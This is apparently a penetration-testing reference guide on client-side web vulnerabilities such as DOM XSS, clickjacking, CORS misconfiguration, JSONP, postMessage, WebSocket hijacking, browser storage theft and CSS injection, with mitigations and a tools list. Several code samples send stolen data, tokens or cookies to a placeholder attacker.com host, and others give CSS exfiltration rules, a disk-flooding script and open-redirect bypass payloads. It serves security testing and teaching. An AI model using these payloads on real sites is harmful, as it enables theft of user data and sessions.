# Client-Side Web Vulnerabilities Reference Guide

> **SPIDER Reference Document** - Comprehensive guide to client-side web vulnerabilities for penetration testing
>
> **Last Updated**: December 2025
> **Research Sources**: OWASP, PortSwigger, HackTricks, Security Research Papers 2024-2025

---

## Table of Contents

1. [DOM-based XSS](#1-dom-based-xss)
2. [Clickjacking](#2-clickjacking)
3. [Cross-Origin Attacks](#3-cross-origin-attacks)
4. [WebSocket Attacks](#4-websocket-attacks)
5. [Browser Storage Attacks](#5-browser-storage-attacks)
6. [Other Client-Side Vulnerabilities](#6-other-client-side-vulnerabilities)
7. [Tools Matrix](#7-tools-matrix)

---

## 1. DOM-based XSS

### 1.1 Overview

DOM-based XSS (or "type-0 XSS") occurs when the attack payload executes as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the page itself (HTTP response) does not change - the client-side code runs in an "unexpected" manner due to malicious DOM modifications.

### 1.2 Sources and Sinks Taxonomy

#### Sources (User-Controllable Input)

| Category | Sources |
|----------|---------|
| **URL-Based** | `document.URL`, `document.documentURI`, `location.href`, `location.search`, `location.hash`, `location.pathname` |
| **Referrer** | `document.referrer` |
| **Window** | `window.name`, `window.opener` |
| **Storage** | `localStorage`, `sessionStorage`, `document.cookie` |
| **Message** | `postMessage` event data |
| **DOM** | `document.body`, element attributes, form inputs |

#### Sinks (Dangerous Execution Points)

| Category | Sinks | Risk Level |
|----------|-------|------------|
| **HTML Sinks** | `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()` | Critical |
| **JavaScript Execution** | `eval()`, `Function()`, `setTimeout()`, `setInterval()` | Critical |
| **Location Sinks** | `location`, `location.href`, `location.assign()`, `location.replace()` | High |
| **jQuery** | `$.html()`, `$()`, `.append()`, `.prepend()`, `.after()`, `.before()` | High |
| **Script Sinks** | `script.src`, `script.text`, `script.textContent` | Critical |

### 1.3 DOM Clobbering

DOM clobbering manipulates the DOM by injecting HTML elements whose `id` or `name` attributes match security-sensitive JavaScript variables.

#### Technique

```html
<!-- Clobber a variable named 'config' -->
<img name="config" src="x">
<a id="config" href="https://attacker.com/malicious.js">

<!-- Double clobbering for nested properties -->
<form id="config"><input name="url" value="https://attacker.com"></form>
```

#### 2024 CVEs

| CVE | Affected | Description |
|-----|----------|-------------|
| CVE-2024-43788 | Webpack | AutoPublicPathRuntimeModule DOM clobbering leads to XSS |
| CVE-2024-45389 | Pagefind | document.currentScript.src clobbering |
| CVE-2024-47068 | Rollup | Bundled scripts DOM clobbering to XSS |
| CVE-2024-53382 | PrismJS | document.currentScript shadow attack |

#### Prevention

```javascript
// Verify objects are what you expect
if (typeof config === 'object' && !(config instanceof HTMLElement)) {
    // Safe to use
}

// Use local variables instead of globals
(function() {
    var config = { url: '/safe/path' };
})();
```

### 1.4 Mutation XSS (mXSS)

mXSS exploits differences between how HTML sanitizers parse content and how browsers render it. The browser's HTML parser "mutates" benign-looking code into executable scripts.

#### How It Works

1. Sanitizer sees: `<math><mi><table><mi><mglyph><style><img src=x onerror=alert(1)>`
2. Browser parses differently due to namespace/parsing mode switches
3. Result: JavaScript executes despite sanitization

#### Bypass Techniques (2024-2025)

| Technique | Description |
|-----------|-------------|
| **Namespace Confusion** | Exploit SVG/MathML namespace handling differences |
| **Parser Differentials** | Abuse complex parsing rules between sanitizer and browser |
| **Comment Injection** | DOMPurify bypass via comment nodes |
| **Context Switching** | Change rendering context post-sanitization |

#### Notable Bypasses

- **DOMPurify**: Multiple bypasses discovered (CVE-2024-5259)
- **lxml.html**: Namespace handling issues
- **Google Caja**: Parser differential exploits

#### Mitigation

```javascript
// Use Trusted Types (browser API)
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (input) => DOMPurify.sanitize(input)
    });
}

// Enforce CSP
Content-Security-Policy: require-trusted-types-for 'script'
```

### 1.5 Framework-Specific XSS

#### React (2024-2025)

| Vulnerability | Description | CVE |
|---------------|-------------|-----|
| **dangerouslySetInnerHTML** | Renders raw HTML without sanitization | N/A |
| **Server Components RCE** | Critical deserialization vulnerability | CVE-2025-55182 (CVSS 10.0) |
| **href javascript:** | Allows javascript: protocol in href | N/A |

**Vulnerable Pattern:**
```jsx
// VULNERABLE
<div dangerouslySetInnerHTML={{__html: userInput}} />
<a href={userControlledUrl}>Link</a>
```

**Safe Pattern:**
```jsx
// SAFE
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

#### Vue.js

| Vulnerability | Description | CVE |
|---------------|-------------|-----|
| **v-html directive** | Renders raw HTML, bypasses sanitization | N/A |
| **Template compiler XSS** | XSS in Vue 2's template compiler | CVE-2024-6783 |
| **Server-side template mixing** | Mixing server templates with Vue | N/A |

**Vulnerable Pattern:**
```html
<!-- VULNERABLE -->
<div v-html="userInput"></div>
```

#### Angular

| Vulnerability | Description |
|---------------|-------------|
| **Template Injection** | Older versions vulnerable to expression evaluation |
| **bypassSecurityTrust*** | Explicit security bypass methods |
| **innerHTML binding** | `[innerHTML]` without sanitization |

---

## 2. Clickjacking

### 2.1 Overview

Clickjacking (UI Redressing) tricks users into clicking on hidden elements by overlaying transparent iframes on legitimate content. Modern browsers provide some protection, but bypasses exist.

### 2.2 Frame Busting Bypass Techniques

| Technique | Description | Browser Support |
|-----------|-------------|-----------------|
| **HTML5 Sandbox** | `sandbox="allow-forms"` neutralizes frame busters | All modern |
| **Double Framing** | Nested frames cause security violations that disable counter-navigation | All browsers |
| **JavaScript Disabling** | Load frame content with JS disabled | IE (Restricted Zone) |
| **Design Mode** | Activating designMode in parent page | Legacy browsers |

#### Sandbox Bypass Example

```html
<!-- Attacker's page -->
<iframe sandbox="allow-forms allow-scripts" src="https://victim.com/login">
</iframe>
<!-- allow-forms permits form submission but blocks top navigation -->
```

### 2.3 Advanced Techniques

#### Cursor Hijacking

```css
/* Hide real cursor, show fake one offset from actual position */
body { cursor: none; }
.fake-cursor {
    position: fixed;
    pointer-events: none;
    /* Offset from real cursor position */
    transform: translate(-100px, -100px);
}
```

#### UI Redressing Variations

| Type | Description |
|------|-------------|
| **Likejacking** | Trick users into liking social media content |
| **Cookiejacking** | Steal cookies via drag-and-drop |
| **Filejacking** | Trick users into uploading files |
| **Cursorjacking** | Manipulate cursor position perception |
| **Tap-jacking** | Mobile-specific clickjacking (more powerful) |

### 2.4 X-Frame-Options vs CSP frame-ancestors

| Feature | X-Frame-Options | CSP frame-ancestors |
|---------|-----------------|---------------------|
| **Status** | Deprecated (legacy support) | Recommended |
| **Values** | DENY, SAMEORIGIN, ALLOW-FROM (obsolete) | 'none', 'self', specific URIs, wildcards |
| **Report Mode** | No | Yes (report-only mode) |
| **Multiple Origins** | No | Yes |
| **Meta Tag** | Not supported | Not supported (header only) |
| **Ancestor Coverage** | No | Yes (covers nested frames) |

#### Recommended Headers

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
X-Frame-Options: SAMEORIGIN
```

---

## 3. Cross-Origin Attacks

### 3.1 CORS Misconfiguration

#### Attack Patterns

| Pattern | Vulnerable Configuration | Exploitation |
|---------|--------------------------|--------------|
| **Reflected Origin** | `Access-Control-Allow-Origin: [reflected from request]` | Full cross-origin data theft |
| **Null Origin** | `Access-Control-Allow-Origin: null` | Data theft via sandbox/data: URI |
| **Wildcard with Credentials** | `Access-Control-Allow-Origin: *` + credentials | Not exploitable (browser blocks) |
| **Subdomain Wildcards** | Trusting `*.domain.com` | XSS on any subdomain = full access |

#### Exploitation Example

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable-api.com/sensitive-data', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

#### Advanced Bypasses

| Bypass | Description |
|--------|-------------|
| **Prefix/Suffix** | `attacker-vulnerable.com` or `vulnerable.com.attacker.com` |
| **Parser Exploits** | Safari: `https://website.com\`.attacker.com/` |
| **Underscore in Subdomain** | Chrome/Firefox: `attacker_domain.vulnerable.com` |
| **DNS Rebinding** | Manipulate DNS TTL to switch origin mid-session |

### 3.2 JSONP Abuse

JSONP bypasses SOP by wrapping JSON data in a callback function, making it executable via script tag.

#### Exploitation

```html
<script>
function stealData(data) {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="https://vulnerable.com/api/user?callback=stealData"></script>
```

#### Attack Types

| Attack | Description |
|--------|-------------|
| **Data Theft** | Steal authenticated user data cross-origin |
| **CSP Bypass** | Use whitelisted JSONP endpoints to execute arbitrary JS |
| **Reflected File Download** | Manipulate callback to trigger download |

### 3.3 postMessage Vulnerabilities

#### Origin Validation Bypasses

| Pattern | Bypass |
|---------|--------|
| `e.origin.indexOf('trusted.com')` | `attacker-trusted.com` or `trusted.com.attacker.com` |
| `e.origin.search('trusted.com')` | `trusted_com` (regex dot is wildcard) |
| Wildcard `*` targetOrigin | Attacker receives sensitive messages |
| `*.domain.com` validation | Any subdomain XSS = full access |

#### Notable 2024 Vulnerability

**CVE-2024-49038 (Microsoft Copilot Studio)** - CVSS 9.3
- Wildcard domain validation allowed cross-tenant attacks
- Token theft via postMessage

#### Exploitation Example

```html
<!-- Attacker's page -->
<iframe src="https://vulnerable.com" id="target"></iframe>
<script>
// Receive messages (if targetOrigin is *)
window.addEventListener('message', function(e) {
    fetch('https://attacker.com/steal?token=' + e.data.token);
});

// Send malicious message (if origin not validated)
document.getElementById('target').contentWindow.postMessage(
    {action: 'eval', code: 'alert(document.cookie)'},
    '*'
);
</script>
```

### 3.4 Cross-Site Script Inclusion (XSSI)

XSSI exploits the fact that scripts can be included cross-origin, leaking data from authenticated JavaScript responses.

#### Types

| Type | Description |
|------|-------------|
| **Static JavaScript** | Sensitive data embedded in static JS files |
| **Dynamic JavaScript** | JS generated based on user session |
| **JSONP** | Callback-wrapped JSON data |
| **Non-JavaScript** | CSV/data files included via script tag |

#### Exploitation

```html
<!-- Override array/object constructors -->
<script>
Array = function() {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(arguments));
};
</script>
<script src="https://vulnerable.com/api/data.js"></script>
```

#### Prevention

- Set `SameSite=Strict` or `Lax` on cookies
- Use anti-CSRF tokens
- Return proper `Content-Type: application/json`
- Add XSSI protection prefix: `)]}'` or `for(;;);`

---

## 4. WebSocket Attacks

### 4.1 Cross-Site WebSocket Hijacking (CSWSH)

Similar to CSRF but for WebSockets. Attacker's page establishes WebSocket connection using victim's cookies.

#### Current State (2024-2025)

| Browser | Protection |
|---------|------------|
| **Firefox** | Protected via Total Cookie Protection (enabled 2022-2024) |
| **Chrome/Chromium** | Vulnerable (unless SameSite cookies enforced) |
| **Safari** | Vulnerable |

#### Exploitation

```html
<script>
var ws = new WebSocket('wss://vulnerable.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify({action: 'getSecrets'}));
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: e.data
    });
};
</script>
```

#### 2024 CVEs

| CVE | Product | Impact |
|-----|---------|--------|
| CVE-2024-26135 | MeshCentral | Full server config theft, session hijacking |
| CVE-2024-11045 | Stable Diffusion WebUI | Malicious extension installation, RCE |
| CVE-2024-55591 | Node.js WebSocket | Authentication bypass (exploited in wild) |

### 4.2 Message Manipulation

| Attack | Description |
|--------|-------------|
| **Message Injection** | Inject malicious commands into WebSocket stream |
| **Message Tampering** | Modify legitimate messages in transit (MITM) |
| **Denial of Service** | Flood WebSocket with messages |

### 4.3 Prevention

```http
# Server-side origin validation
if (request.headers.origin !== 'https://legitimate.com') {
    reject connection
}

# Use SameSite cookies
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly

# Use token-based auth (not cookies)
Authorization: Bearer <JWT>
```

---

## 5. Browser Storage Attacks

### 5.1 localStorage/sessionStorage Theft

Any JavaScript on the page can access storage - XSS leads to complete data theft.

#### Attack Vector

```javascript
// Steal all localStorage
var stolen = JSON.stringify(localStorage);
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: stolen
});

// Steal JWT tokens
var token = localStorage.getItem('authToken');
```

#### Common Targets

| Data Type | Risk |
|-----------|------|
| JWT Tokens | Session hijacking |
| API Keys | Unauthorized API access |
| User Preferences | Privacy leak |
| Form Data | Sensitive data exposure |
| Shopping Cart | Price manipulation |

#### Secure Alternatives

| Storage | XSS Protection | CSRF Protection | Best For |
|---------|----------------|-----------------|----------|
| **HttpOnly Cookie** | Yes | Needs SameSite | Session tokens |
| **Secure Cookie** | Depends | Needs SameSite | Auth tokens |
| **sessionStorage** | No | N/A | Temporary non-sensitive data |
| **localStorage** | No | N/A | UI preferences only |

### 5.2 IndexedDB Exploitation

#### Vulnerabilities

| Attack | Description |
|--------|-------------|
| **XSS Data Theft** | Read entire client database via XSS |
| **IFA (Flooding Attack)** | Consume all disk space rapidly |
| **Same-Origin Violation** | Safari 15 bug leaked browsing history |
| **Use-After-Free** | CVE-2021-30858 - WebKit RCE |

#### IFA (IndexedDB Flooding Attack)

```javascript
// Attacker can flood disk with 8MB blobs
const db = await indexedDB.open('flood');
const store = db.createObjectStore('data');
for (let i = 0; i < 1000; i++) {
    store.put(new Blob([new Array(8 * 1024 * 1024).fill('A')]), i);
}
```

**Vulnerable**: Chrome, Opera, Edge, Brave, Safari, Chromium-based
**Resistant**: Firefox (stricter storage limits)

### 5.3 Cookie Theft Techniques

| Method | Description | Prevention |
|--------|-------------|------------|
| **XSS** | `document.cookie` access | HttpOnly flag |
| **MITM** | Network interception | Secure flag |
| **CSRF** | Force cookie transmission | SameSite flag |
| **Subdomain** | `*.domain.com` cookie scope | Explicit domain |

---

## 6. Other Client-Side Vulnerabilities

### 6.1 Open Redirects

#### Exploitation Chains

| Chain | Attack Flow |
|-------|-------------|
| **Phishing** | Legit domain -> attacker site |
| **OAuth Token Theft** | Steal tokens via redirect_uri manipulation |
| **SSRF** | Use open redirect to access internal resources |
| **XSS** | Redirect to `javascript:` URI (some contexts) |

#### 2024 CVEs

| CVE | Product | CVSS |
|-----|---------|------|
| CVE-2025-4123 | Grafana | High - leads to account takeover |
| CVE-2024-8883 | Keycloak | High - OAuth flow exploitation |
| CVE-2024-9266 | Express 3.x | Medium - location() path handling |

#### Bypass Techniques

```
# Basic
?url=https://attacker.com

# Protocol-relative
?url=//attacker.com

# Backslash trick
?url=https://legitimate.com\@attacker.com

# URL encoding
?url=https://attacker.com%00.legitimate.com

# Double URL encoding
?url=https://attacker%252Ecom

# Unicode
?url=https://legitimate.com%E3%80%82attacker.com
```

### 6.2 HTML Injection

Even without script execution, HTML injection enables attacks:

#### Attack Techniques

| Technique | Impact |
|-----------|--------|
| **Fake Forms** | Credential phishing with legitimate domain |
| **UI Spoofing** | Fake warnings, alerts, popups |
| **DOM Clobbering** | Hijack JS variables via HTML elements |
| **Link Injection** | Inject malicious links |
| **MathML (Firefox)** | XSS via `href` attribute in MathML |

#### 2024 Incidents

- **WooCommerce** (CVE-2024-9944): 7M+ sites affected via Order Notes field
- **150K Website Campaign** (March 2025): JavaScript injection promoting gambling sites

### 6.3 CSS Injection

CSS-only attacks for data exfiltration when XSS is blocked.

#### Attribute Selector Exfiltration

```css
/* Exfiltrate CSRF token character by character */
input[name="csrf"][value^="a"] {
    background: url(https://attacker.com/exfil?char=a);
}
input[name="csrf"][value^="b"] {
    background: url(https://attacker.com/exfil?char=b);
}
/* ... repeat for all characters */
```

#### Advanced Techniques (2024)

| Technique | Description |
|-----------|-------------|
| **:has() Selector** | Modern CSS enables broader extraction |
| **@import Chain** | Dynamic payload loading from attacker server |
| **Font-Face** | Extract text content via font requests |
| **Scroll-to-Text** | Detect text presence via scroll behavior |

#### Data at Risk

- CSRF tokens
- Usernames/emails (displayed in UI)
- OAuth tokens
- Any input field values

### 6.4 Reverse Tabnabbing

Opened tabs can modify the opener window via `window.opener`.

#### Attack

```html
<!-- Victim's page -->
<a href="https://attacker.com" target="_blank">Click me</a>

<!-- Attacker's page -->
<script>
if (window.opener) {
    window.opener.location = 'https://phishing.com/fake-login';
}
</script>
```

#### 2024 Status

**Modern browsers (Chrome 88+, Firefox 79+, Safari 12.1+)**: Automatically set `rel="noopener"` for `target="_blank"` links.

**Still Required For**:
- `window.open()` calls (must specify `noopener`)
- Legacy browser support
- JavaScript-generated links

#### Prevention

```html
<!-- HTML -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Link</a>

<!-- JavaScript -->
window.open('https://external.com', '_blank', 'noopener,noreferrer');

<!-- HTTP Header -->
Cross-Origin-Opener-Policy: same-origin
```

---

## 7. Tools Matrix

### 7.1 DOM XSS Testing

| Tool | Type | Features |
|------|------|----------|
| **DOM Invader** | Burp Extension | Automatic source/sink detection, canary tracking, prototype pollution, DOM clobbering |
| **Untrusted Types** | Browser Extension | Trusted Types policy testing |
| **DomLoggerpp** | Browser Extension | DOM event logging and analysis |
| **postMessage-tracker** | Chrome Extension | postMessage monitoring |
| **Posta** | Standalone | postMessage vulnerability research |

### 7.2 XSS Scanning

| Tool | Type | Best For |
|------|------|----------|
| **Dalfox** | CLI | Fast parameter analysis, DOM-based XSS, blind XSS |
| **XSStrike** | CLI | Advanced XSS detection with fuzzing |
| **Nuclei** | CLI | Template-based vulnerability scanning |
| **OWASP ZAP** | GUI/CLI | Comprehensive web app scanning |

#### Dalfox Usage

```bash
# Single URL
dalfox url "https://target.com/page?param=test"

# From file (waybackurls output)
cat urls.txt | dalfox pipe

# With options
dalfox url "https://target.com" --blind "https://callback.oast.me"
```

### 7.3 Burp Suite Extensions (Client-Side)

| Extension | Purpose |
|-----------|---------|
| **DOM Invader** | DOM-based vulnerability testing |
| **JSpector** | JavaScript analysis, endpoint extraction |
| **Retire.js** | Detect vulnerable JavaScript libraries |
| **JS Link Finder** | Extract endpoints from JavaScript |
| **CSP Bypass** | Content Security Policy weakness detection |
| **HTML5 Auditor** | HTML5 security feature analysis |
| **Noopener Extension** | Detect missing noopener/noreferrer |
| **SOMEtime** | Same Origin Method Execution detection |
| **Active Scan++** | Enhanced scanning including client-side |

### 7.4 Browser DevTools Techniques

| Technique | How To | Purpose |
|-----------|--------|---------|
| **Console Encoding** | `btoa()`, `atob()`, `encodeURIComponent()` | Encode/decode payloads |
| **Storage Manipulation** | Application > Storage | Modify localStorage/cookies |
| **Network Analysis** | Network tab | Inspect requests/responses |
| **JavaScript Debugging** | Sources > Breakpoints | Trace data flow |
| **DOM Inspection** | Elements tab | Identify injection points |
| **Disable JavaScript** | Settings > Debugger | Test behavior without JS |

### 7.5 Specialized Tools

| Tool | Category | Description |
|------|----------|-------------|
| **PMHook** | postMessage | TamperMonkey library for message interception |
| **BrowserAudit** | General | Comprehensive browser security testing |
| **tplmap** | SSTI | Server-side template injection (related to XSS) |
| **PyCript** | Encryption | Bypass client-side encryption |

### 7.6 Automation Workflow

```bash
# 1. Discovery
waybackurls target.com | grep "=" > params.txt
gau target.com | grep "=" >> params.txt

# 2. Parameter Analysis
cat params.txt | dalfox pipe -o xss-findings.txt

# 3. Template Scanning
nuclei -l urls.txt -t xss/ -o nuclei-xss.txt

# 4. Manual Testing with DOM Invader
# Configure in Burp Suite > Burp Browser > DOM Invader settings

# 5. JavaScript Analysis
# Use JSpector in Burp to find hidden endpoints
# Run Retire.js to find vulnerable libraries
```

---

## Quick Reference: Testing Checklist

### DOM XSS

- [ ] Identify all URL-based sources (hash, search, pathname)
- [ ] Test `postMessage` listeners for origin validation
- [ ] Check for `innerHTML`, `document.write`, `eval` sinks
- [ ] Look for prototype pollution vectors
- [ ] Test for DOM clobbering opportunities
- [ ] Analyze JavaScript frameworks for known XSS patterns

### Clickjacking

- [ ] Check for X-Frame-Options header
- [ ] Check for CSP frame-ancestors directive
- [ ] Test frame-buster bypass with sandbox attribute
- [ ] Verify SameSite cookie attribute

### CORS

- [ ] Test reflected origin
- [ ] Test null origin
- [ ] Test subdomain wildcards
- [ ] Check credentials header handling

### WebSockets

- [ ] Test for CSWSH with cross-origin page
- [ ] Check origin validation on handshake
- [ ] Verify SameSite cookies or token-based auth

### Storage

- [ ] Check what sensitive data is in localStorage
- [ ] Verify tokens use HttpOnly cookies instead
- [ ] Test for XSS to localStorage theft chain

---

## References

### Primary Sources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Research Papers (2024-2025)

- "Parse Me, Baby, One More Time: Bypassing HTML Sanitizer via Parsing Differentials" (May 2024)
- "MatriXSSed: A New Taxonomy for XSS in the Modern Web" (April 2025)
- "The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets" (USENIX Security 2025)
- "Cross-Site WebSocket Hijacking Exploitation in 2025" (Include Security, April 2025)

### Tool Documentation

- [Dalfox Documentation](https://dalfox.hahwul.com/)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [Burp Suite DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

---

*"Every input field speaks to me. No application hides its secrets from me." - SPIDER*
